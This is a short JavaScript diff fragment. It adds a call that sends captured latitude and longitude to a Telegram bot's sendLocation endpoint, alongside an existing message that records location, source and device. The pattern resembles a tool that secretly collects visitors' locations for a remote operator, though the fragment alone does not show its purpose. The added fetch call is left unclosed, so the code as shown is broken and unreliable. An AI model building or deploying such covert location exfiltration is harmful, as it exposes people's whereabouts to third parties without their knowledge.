@@ -52,6 +52,12 @@
                 `Longitude: ${lon}\n` +
                 `Source: ${source}\n` +
                 `Device: ${device}`;
+                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+    
+
 
             const response = await fetch(url, {
                 method: 'POST',
